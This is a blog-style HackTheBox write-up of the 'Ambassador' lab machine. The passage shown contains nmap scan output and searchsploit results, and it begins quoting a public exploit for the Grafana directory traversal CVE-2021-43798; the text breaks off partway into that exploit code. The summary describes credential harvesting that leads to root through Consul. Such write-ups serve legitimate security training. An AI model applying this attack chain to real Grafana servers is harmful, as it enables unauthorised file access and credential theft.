@@ -1,0 +1,551 @@
+<!doctype html><html lang=en><head><meta charset=UTF-8><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-capable content="yes"><meta name=application-name content><meta name=apple-mobile-web-app-status-bar-style content="#fff"><meta name=apple-mobile-web-app-title content><title>Ambassador | HackTheBox -
+</title><link rel=alternate href=https://h4r1337.github.io/posts/ambassador/ hreflang=en><link rel=canonical href=https://h4r1337.github.io/posts/ambassador/><link rel=prev href=https://h4r1337.github.io/posts/simple-ctf/><link rel=next href=https://h4r1337.github.io/posts/photobomb/><meta name=description content="In this medium machine we will exploit a directory traversal vulnarability in an outdated grafana instance to read the config and db file. From that we will get passwords for grafana admin panel and mysql instance. Logging into the mysql instance leaks the SSH password for the user `developer` who has access to a git repo. The git commit history leaks a token used for Consul. We will use that token to execute command as root."><meta name=keywords content="HTB,hackthebox,Writeup,Walkthrough,Ambassador,CVE-2021-43798,Directory Traversal,mysql,Beginners,Medium,Linux,Consul,RCE"><meta property="og:url" content="https://h4r1337.github.io/posts/ambassador/"><meta property="og:site_name" content="h4r1337 blog | CTF writeups"><meta property="og:title" content="Ambassador | HackTheBox"><meta property="og:description" content="In this medium machine we will exploit a directory traversal vulnarability in an outdated grafana instance to read the config and db file. From that we will get passwords for grafana admin panel and mysql instance. Logging into the mysql instance leaks the SSH password for the user `developer` who has access to a git repo. The git commit history leaks a token used for Consul. We will use that token to execute command as root."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-01-31T21:30:30+05:30"><meta property="article:modified_time" content="2023-01-31T21:30:30+05:30"><meta property="article:tag" content="HackTheBox"><meta property="article:tag" content="Linux"><meta property="article:tag" content="Medium"><meta property="article:tag" content="Grafana"><meta property="article:tag" content="Path-Traversal"><meta property="article:tag" content="CVE-2021-43798"><meta property="og:image" content="https://h4r1337.github.io/img/ambassador/cover.webp"><meta property="og:see_also" content="https://h4r1337.github.io/posts/resource/"><meta property="og:see_also" content="https://h4r1337.github.io/posts/permx/"><meta property="og:see_also" content="https://h4r1337.github.io/posts/blurry/"><meta property="og:see_also" content="https://h4r1337.github.io/posts/board-light/"><meta property="og:see_also" content="https://h4r1337.github.io/posts/perfection/"><meta property="og:see_also" content="https://h4r1337.github.io/posts/two-million/"><meta property="og:see_also" content="https://h4r1337.github.io/posts/precious/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://h4r1337.github.io/img/ambassador/cover.webp"><meta name=twitter:title content="Ambassador | HackTheBox"><meta name=twitter:description content="In this medium machine we will exploit a directory traversal vulnarability in an outdated grafana instance to read the config and db file. From that we will get passwords for grafana admin panel and mysql instance. Logging into the mysql instance leaks the SSH password for the user `developer` who has access to a git repo. The git commit history leaks a token used for Consul. We will use that token to execute command as root."><meta name=referrer content="no-referrer-when-downgrade"><link rel=apple-touch-icon sizes=180x180 href=/favicons/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicons/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicons/favicon-16x16.png><link rel=manifest href=/favicons/site.webmanifest><link rel=mask-icon href=/favicons/safari-pinned-tab.svg color=#5bbad5><meta name=apple-mobile-web-app-title content="Jekyll Klise"><meta name=application-name content="Jekyll Klise"><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#2c2c2c"><link href=https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css rel=stylesheet><link rel=stylesheet href=/sass/main.min.2480d733c3cd78de5d135eb2d8c0b0f964b2bf1e047d180f4f363bdcc3b23b20.css integrity="sha256-JIDXM8PNeN5dE16y2MCw+WSyvx4EfRgPTzY73MOyOyA="><link rel=stylesheet href=/lib/fontawesome-free/all.min.e5e202e3c899507992952533f57b634722b69b34241d271963559d31aa33ef81.css integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E="></head><body data-theme=dark class=notransition><script>const body=document.body,data=body.getAttribute("data-theme"),initTheme=e=>{e==="dark"?body.setAttribute("data-theme","dark"):e==="light"?body.removeAttribute("data-theme"):localStorage.setItem("theme",data)};initTheme(localStorage.getItem("theme")),setTimeout(()=>body.classList.remove("notransition"),75)</script><script id=partial/analytics.html data-goatcounter=https://h4r1337-blog.goatcounter.com/count async src=//gc.zgo.at/count.js></script><div class=navbar role=navigation><nav class=menu><input type=checkbox id=menu-trigger class=menu-trigger>
+<label for=menu-trigger><span class=menu-icon><svg width="24" height="24" viewBox="0 0 512 512"><path d="M64 384H448V341.33H64zm0-106.67H448V234.67H64zM64 128v42.67H448V128z"/></svg>
+</span></label><a id=mode href=#><svg class="mode-sunny" width="24" height="24" viewBox="0 0 512 512"><title>LIGHT</title><line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/></svg><svg class="mode-moon" width="24" height="24" viewBox="0 0 512 512"><title>DARK</title><line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/></svg></a><div class=trigger><div class=trigger-container><a class=menu-link href=/ title=home>home
+</a><a class=menu-link href=/posts title=posts>posts
+</a><a class=menu-link href=/series title=series>series
+</a><a class=menu-link href=/resume.pdf title=resume>resume
+</a><a class=menu-link href=/whoami title=whoami>whoami
+</a><a class="menu-link rss" href=/index.xml><svg width="17" height="17" viewBox="0 0 512 512" fill="#ed812e"><title>RSS</title><path d="M108.56 342.78a60.34 60.34.0 1060.56 60.44 60.63 60.63.0 00-60.56-60.44z"/><path d="M48 186.67v86.55c52 0 101.94 15.39 138.67 52.11s52 86.56 52 138.67h86.66c0-151.56-125.66-277.33-277.33-277.33z"/><path d="M48 48v86.56c185.25.0 329.22 144.08 329.22 329.44H464C464 234.66 277.67 48 48 48z"/></svg></a></div></div></nav></div><div class="wrapper post"><main class=page-content aria-label=Content><article itemscope itemtype=https://schema.org/BlogPosting><header class=header><div class=tags><span itemprop=keywords><a href=https://h4r1337.github.io/tags/hackthebox/ class=tag>HACKTHEBOX</a>
+,
+<a href=https://h4r1337.github.io/tags/linux/ class=tag>LINUX</a>
+,
+<a href=https://h4r1337.github.io/tags/medium/ class=tag>MEDIUM</a>
+,
+<a href=https://h4r1337.github.io/tags/grafana/ class=tag>GRAFANA</a>
+,
+<a href=https://h4r1337.github.io/tags/path-traversal/ class=tag>PATH-TRAVERSAL</a>
+,
+<a href=https://h4r1337.github.io/tags/cve-2021-43798/ class=tag>CVE-2021-43798</a>
+,
+<a href=https://h4r1337.github.io/tags/mysql/ class=tag>MYSQL</a>
+,
+<a href=https://h4r1337.github.io/tags/git/ class=tag>GIT</a>
+,
+<a href=https://h4r1337.github.io/tags/consul/ class=tag>CONSUL</a>
+,
+<a href=https://h4r1337.github.io/tags/rce/ class=tag>RCE</a></span></div><h1 class=header-title itemprop=headline>Ambassador | HackTheBox</h1><div class=post-meta><time datetime="2023-01-31 21:30:30 +0530 +0530" itemprop=datePublished>2023-01-31
+</time><span itemprop=author itemscope itemtype=https://schema.org/Person><span itemprop=name>h4r1337</span>
+</span><time hidden datetime="2023-01-31 21:30:30 +0530 +0530" itemprop=dateModified></time>
+<span hidden itemprop=publisher itemtype=Person>h4r1337</span>
+<span hidden itemprop=mainEntityOfPage>In this medium machine we will exploit a directory traversal vulnarability in an outdated grafana instance to read the config and db file. From that we will get passwords for grafana admin panel and mysql instance. Logging into the mysql instance leaks the SSH password for the user `developer` who has access to a git repo. The git commit history leaks a token used for Consul. We will use that token to execute command as root.</span></div></header><div class=page-content itemprop=articleBody><h3 id=overview><a href=#overview class=anchor-head aria-label=Anchor></a>Overview</h3><figure><img src=/img/ambassador/cover.webp></figure><table><thead><tr><th style=text-align:center>Title</th><th style=text-align:center><a href=https://app.hackthebox.com/machines/499>Ambassador</a></th></tr></thead><tbody><tr><td style=text-align:center>Difficulty</td><td style=text-align:center>Medium</td></tr><tr><td style=text-align:center>Machine</td><td style=text-align:center>Linux</td></tr><tr><td style=text-align:center>Maker</td><td style=text-align:center><a href=https://www.hackthebox.eu/home/users/profile/24906><img src=https://www.hackthebox.eu/badge/image/24906 alt style=display:unset></a></td></tr></tbody></table><blockquote><p>[tip]- About Ambassador
+In this medium machine we will exploit a directory traversal vulnarability in an outdated grafana instance to read config and db files. From that we will get passwords for grafana admin panel and mysql instance. Logging into the mysql instance leaks the SSH password for the user <code>developer</code> who has access to a git repo. The git commit history leaks a token used for Consul. We will use that token to execute command as root.</p></blockquote><h4 id=used-tools><a href=#used-tools class=anchor-head aria-label=Anchor></a>Used tools</h4><ul><li>nmap</li><li>searchsploit</li><li><a href=https://www.exploit-db.com/exploits/50581>CVE-2021-43798</a></li></ul><hr><h2 id=information-gathering><a href=#information-gathering class=anchor-head aria-label=Anchor></a>Information Gathering</h2><p>Enumerated open TCP ports:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span> nmap -sC -sV 10.10.11.183 -oA nmap/initial
+</span></span><span style=display:flex><span>Starting Nmap 7.80 <span style=color:#fe8019>(</span> https://nmap.org <span style=color:#fe8019>)</span> at 2023-01-21 12:42 IST
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#fe8019>for</span> 10.10.11.183
+</span></span><span style=display:flex><span>Host is up <span style=color:#fe8019>(</span>0.51s latency<span style=color:#fe8019>)</span>.
+</span></span><span style=display:flex><span>Not shown: <span style=color:#d3869b>996</span> closed ports
+</span></span><span style=display:flex><span>PORT     STATE SERVICE     VERSION
+</span></span><span style=display:flex><span>22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span style=color:#fe8019>(</span>Ubuntu Linux; protocol 2.0<span style=color:#fe8019>)</span>
+</span></span><span style=display:flex><span>80/tcp   open  http        Apache httpd 2.4.41 <span style=color:#fe8019>((</span>Ubuntu<span style=color:#fe8019>))</span>
+</span></span><span style=display:flex><span>|_http-generator: Hugo 0.94.2
+</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.41 <span style=color:#fe8019>(</span>Ubuntu<span style=color:#fe8019>)</span>
+</span></span><span style=display:flex><span>|_http-title: Ambassador Development Server
+</span></span><span style=display:flex><span>3000/tcp open  ppp?
+</span></span><span style=display:flex><span>| fingerprint-strings:
+</span></span><span style=display:flex><span>|   FourOhFourRequest:
+</span></span><span style=display:flex><span>|     HTTP/1.0 <span style=color:#d3869b>302</span> Found
+</span></span><span style=display:flex><span>|     Cache-Control: no-cache
+</span></span><span style=display:flex><span>|     Content-Type: text/html; charset<span style=color:#fe8019>=</span>utf-8
+</span></span><span style=display:flex><span>|     Expires: -1
+</span></span><span style=display:flex><span>|     Location: /login
+</span></span><span style=display:flex><span>|     Pragma: no-cache
+</span></span><span style=display:flex><span>|     Set-Cookie: redirect_to<span style=color:#fe8019>=</span>%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path<span style=color:#fe8019>=</span>/; HttpOnly; SameSite<span style=color:#fe8019>=</span>Lax
+</span></span><span style=display:flex><span>|     X-Content-Type-Options: nosniff
+</span></span><span style=display:flex><span>|     X-Frame-Options: deny
+</span></span><span style=display:flex><span>|     X-Xss-Protection: 1; mode<span style=color:#fe8019>=</span>block
+</span></span><span style=display:flex><span>|     Date: Sat, <span style=color:#d3869b>21</span> Jan <span style=color:#d3869b>2023</span> 07:14:57 GMT
+</span></span><span style=display:flex><span>|     Content-Length: <span style=color:#d3869b>29</span>
+</span></span><span style=display:flex><span>|     href<span style=color:#fe8019>=</span><span style=color:#b8bb26>&#34;/login&#34;</span>&gt;Found&lt;/a&gt;.
+</span></span><span style=display:flex><span>|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
+</span></span><span style=display:flex><span>|     HTTP/1.1 <span style=color:#d3869b>400</span> Bad Request
+</span></span><span style=display:flex><span>|     Content-Type: text/plain; charset<span style=color:#fe8019>=</span>utf-8
+</span></span><span style=display:flex><span>|     Connection: close
+</span></span><span style=display:flex><span>|     Request
+</span></span><span style=display:flex><span>|   GetRequest:
+</span></span><span style=display:flex><span>|     HTTP/1.0 <span style=color:#d3869b>302</span> Found
+</span></span><span style=display:flex><span>|     Cache-Control: no-cache
+</span></span><span style=display:flex><span>|     Content-Type: text/html; charset<span style=color:#fe8019>=</span>utf-8
+</span></span><span style=display:flex><span>|     Expires: -1
+</span></span><span style=display:flex><span>|     Location: /login
+</span></span><span style=display:flex><span>|     Pragma: no-cache
+</span></span><span style=display:flex><span>|     Set-Cookie: redirect_to<span style=color:#fe8019>=</span>%2F; Path<span style=color:#fe8019>=</span>/; HttpOnly; SameSite<span style=color:#fe8019>=</span>Lax
+</span></span><span style=display:flex><span>|     X-Content-Type-Options: nosniff
+</span></span><span style=display:flex><span>|     X-Frame-Options: deny
+</span></span><span style=display:flex><span>|     X-Xss-Protection: 1; mode<span style=color:#fe8019>=</span>block
+</span></span><span style=display:flex><span>|     Date: Sat, <span style=color:#d3869b>21</span> Jan <span style=color:#d3869b>2023</span> 07:14:13 GMT
+</span></span><span style=display:flex><span>|     Content-Length: <span style=color:#d3869b>29</span>
+</span></span><span style=display:flex><span>|     href<span style=color:#fe8019>=</span><span style=color:#b8bb26>&#34;/login&#34;</span>&gt;Found&lt;/a&gt;.
+</span></span><span style=display:flex><span>|   HTTPOptions:
+</span></span><span style=display:flex><span>|     HTTP/1.0 <span style=color:#d3869b>302</span> Found
+</span></span><span style=display:flex><span>|     Cache-Control: no-cache
+</span></span><span style=display:flex><span>|     Expires: -1
+</span></span><span style=display:flex><span>|     Location: /login
+</span></span><span style=display:flex><span>|     Pragma: no-cache
+</span></span><span style=display:flex><span>|     Set-Cookie: redirect_to<span style=color:#fe8019>=</span>%2F; Path<span style=color:#fe8019>=</span>/; HttpOnly; SameSite<span style=color:#fe8019>=</span>Lax
+</span></span><span style=display:flex><span>|     X-Content-Type-Options: nosniff
+</span></span><span style=display:flex><span>|     X-Frame-Options: deny
+</span></span><span style=display:flex><span>|     X-Xss-Protection: 1; mode<span style=color:#fe8019>=</span>block
+</span></span><span style=display:flex><span>|     Date: Sat, <span style=color:#d3869b>21</span> Jan <span style=color:#d3869b>2023</span> 07:14:21 GMT
+</span></span><span style=display:flex><span>|_    Content-Length: <span style=color:#d3869b>0</span>
+</span></span><span style=display:flex><span>3306/tcp open  nagios-nsca Nagios NSCA
+</span></span><span style=display:flex><span>| mysql-info:
+</span></span><span style=display:flex><span>|   Protocol: <span style=color:#d3869b>10</span>
+</span></span><span style=display:flex><span>|   Version: 8.0.30-0ubuntu0.20.04.2
+</span></span><span style=display:flex><span>|   Thread ID: <span style=color:#d3869b>222</span>
+</span></span><span style=display:flex><span>|   Capabilities flags: <span style=color:#d3869b>65535</span>
+</span></span><span style=display:flex><span>|   Some Capabilities: LongColumnFlag, Support41Auth, Speaks41ProtocolOld, SupportsTransactions, IgnoreSigpipes, SupportsCompression, SupportsLoadDataLocal, ConnectWithDatabase, SwitchToSSLAfterHandshake, Speaks41ProtocolNew, FoundRows, InteractiveClient, IgnoreSpaceBeforeParenthesis, ODBCClient, LongPassword, DontAllowDatabaseTableColumn, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
+</span></span><span style=display:flex><span>|   Status: Autocommit
+</span></span><span style=display:flex><span>|   Salt: 4B<span style=color:#b8bb26>\x</span>06<span style=color:#b8bb26>\x</span>0Bg^<span style=color:#b8bb26>\x</span>0E3<span style=color:#b8bb26>\x</span>10T<span style=color:#b8bb26>\x</span>0FW<span style=color:#fe8019>}</span>cpl*i<span style=color:#fe8019>(</span><span style=color:#b8bb26>\x</span>0F
+</span></span><span style=display:flex><span>|_  Auth Plugin Name: caching_sha2_password
+</span></span><span style=display:flex><span><span style=color:#d3869b>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style=display:flex><span>SF-Port3000-TCP:V<span style=color:#fe8019>=</span>7.80%I<span style=color:#fe8019>=</span>7%D<span style=color:#fe8019>=</span>1/21%Time<span style=color:#fe8019>=</span>63CB90C4%P<span style=color:#fe8019>=</span>x86_64-pc-linux-gnu%r<span style=color:#fe8019>(</span>Ge
+</span></span><span style=display:flex><span>SF:nericLines,67,<span style=color:#b8bb26>&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:20Request&#34;</span><span style=color:#fe8019>)</span>%r<span style=color:#fe8019>(</span>GetRequest,174,<span style=color:#b8bb26>&#34;HTTP/1\.0\x20302\x20Found\r\nCache-Contro
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:l:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nExpir
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:es:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\r\nSet-Cookie:\
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:x20redirect_to=%2F;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Conten
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:t-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protect
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:ion:\x201;\x20mode=block\r\nDate:\x20Sat,\x2021\x20Jan\x202023\x2007:14
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF::13\x20GMT\r\nContent-Length:\x2029\r\n\r\n&lt;a\x20href=\&#34;/login\&#34;&gt;Found&lt;
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:/a&gt;\.\n\n&#34;</span><span style=color:#fe8019>)</span>%r<span style=color:#fe8019>(</span>Help,67,<span style=color:#b8bb26>&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:x20Bad\x20Request&#34;</span><span style=color:#fe8019>)</span>%r<span style=color:#fe8019>(</span>HTTPOptions,12E,<span style=color:#b8bb26>&#34;HTTP/1\.0\x20302\x20Found\r\nCac
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:he-Control:\x20no-cache\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPra
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:gma:\x20no-cache\r\nSet-Cookie:\x20redirect_to=%2F;\x20Path=/;\x20HttpO
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:nly;\x20SameSite=Lax\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-O
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:ptions:\x20deny\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Sa
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:t,\x2021\x20Jan\x202023\x2007:14:21\x20GMT\r\nContent-Length:\x200\r\n\
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:r\n&#34;</span><span style=color:#fe8019>)</span>%r<span style=color:#fe8019>(</span>RTSPRequest,67,<span style=color:#b8bb26>&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:\x20Bad\x20Request&#34;</span><span style=color:#fe8019>)</span>%r<span style=color:#fe8019>(</span>SSLSessionReq,67,<span style=color:#b8bb26>&#34;HTTP/1\.1\x20400\x20Bad\x20Req
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:0close\r\n\r\n400\x20Bad\x20Request&#34;</span><span style=color:#fe8019>)</span>%r<span style=color:#fe8019>(</span>TerminalServerCookie,67,<span style=color:#b8bb26>&#34;HTTP/1
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&#34;</span><span style=color:#fe8019>)</span>%r<span style=color:#fe8019>(</span>TLSSess
+</span></span><span style=display:flex><span>SF:ionReq,67,<span style=color:#b8bb26>&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:quest&#34;</span><span style=color:#fe8019>)</span>%r<span style=color:#fe8019>(</span>Kerberos,67,<span style=color:#b8bb26>&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:x20Bad\x20Request&#34;</span><span style=color:#fe8019>)</span>%r<span style=color:#fe8019>(</span>FourOhFourRequest,1A1,<span style=color:#b8bb26>&#34;HTTP/1\.0\x20302\x20Found\
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:r\nCache-Control:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:=utf-8\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:r\nSet-Cookie:\x20redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity\.txt
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:%252ebak;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Content-Type-Opt
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:ions:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protection:\x201;
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:\x20mode=block\r\nDate:\x20Sat,\x2021\x20Jan\x202023\x2007:14:57\x20GMT
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>SF:\r\nContent-Length:\x2029\r\n\r\n&lt;a\x20href=\&#34;/login\&#34;&gt;Found&lt;/a&gt;\.\n\n&#34;</span>
+</span></span><span style=display:flex><span>SF:<span style=color:#fe8019>)</span>;
+</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style=display:flex><span>Nmap <span style=color:#fe8019>done</span>: <span style=color:#d3869b>1</span> IP address <span style=color:#fe8019>(</span><span style=color:#d3869b>1</span> host up<span style=color:#fe8019>)</span> scanned in 214.46 seconds
+</span></span></code></pre></div><h3 id=port-80---http-apache-2441><a href=#port-80---http-apache-2441 class=anchor-head aria-label=Anchor></a>Port 80 - HTTP (Apache 2.4.41)</h3><figure><img src=/img/ambassador/Pasted%20image%2020230130145523.webp></figure><p>Port 80 is running on <code>hugo</code>, a static site generator. So we can&rsquo;t find much in there except this post.</p><figure><img src=/img/ambassador/Pasted%20image%2020230130150352.webp></figure><p>maybe a hint or something&mldr;</p><h3 id=port-3000---http-grafana><a href=#port-3000---http-grafana class=anchor-head aria-label=Anchor></a>Port 3000 - HTTP (Grafana)</h3><figure><img src=/img/ambassador/Pasted%20image%2020230131173053.webp></figure><p>It is a <code>grafana</code> login page. And we can see the version in the bottom. We can use <code>searchsploit</code> to check whether the grafana version is vulnerable or not.</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span> searchsploit grafana
+</span></span><span style=display:flex><span>------------------------------------------------------------- ---------------------------------
+</span></span><span style=display:flex><span> Exploit Title                                               |  Path
+</span></span><span style=display:flex><span>------------------------------------------------------------- ---------------------------------
+</span></span><span style=display:flex><span>Grafana 7.0.1 - Denial of Service (PoC)                      | linux/dos/48638.sh
+</span></span><span style=display:flex><span>Grafana 8.3.0 - Directory Traversal and Arbitrary File Read  | multiple/webapps/50581.py
+</span></span><span style=display:flex><span>------------------------------------------------------------- ---------------------------------
+</span></span><span style=display:flex><span>Shellcodes: No Results
+</span></span></code></pre></div><p>And there&rsquo;s an exploit for Grafana version <code>8.3.0</code> and below ( <strong><code>CVE-2021-43798</code></strong> ) . Let&rsquo;s copy that to the current directory using the <code>-m</code> flag.</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span> searchsploit -m 50581
+</span></span></code></pre></div><hr><h2 id=exploitation><a href=#exploitation class=anchor-head aria-label=Anchor></a>Exploitation</h2><h3 id=directory-traversal><a href=#directory-traversal class=anchor-head aria-label=Anchor></a>Directory Traversal</h3><blockquote><p>Grafana versions 8.0.0-beta1 through 8.3.0 is vulnerable to directory traversal, allowing access to local files. The vulnerable URL path is: &lt;grafana_host_url>/public/plugins//, where is the plugin ID for any installed plugin.</p></blockquote><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#928374;font-style:italic>## Exploit Title: Grafana 8.3.0 - Directory Traversal and Arbitrary File Read</span>
+</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic>## Date: 08/12/2021</span>
+</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic>## Exploit Author: s1gh</span>
+</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic>## Vendor Homepage: https://grafana.com/</span>
+</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic>## Vulnerability Details: https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p</span>
+</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic>## Version: V8.0.0-beta1 through V8.3.0</span>
+</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic>## Description: Grafana versions 8.0.0-beta1 through 8.3.0 is vulnerable to directory traversal, allowing access to local files.</span>
+</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic>## CVE: CVE-2021-43798</span>
+</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic>## Tested on: Debian 10</span>
+</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic>## References: https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p47p</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic>#!/usr/bin/env python3</span>
+</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic>## -*- coding: utf-8 -*-</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#fe8019>import</span> requests
+</span></span><span style=display:flex><span><span style=color:#fe8019>import</span> argparse
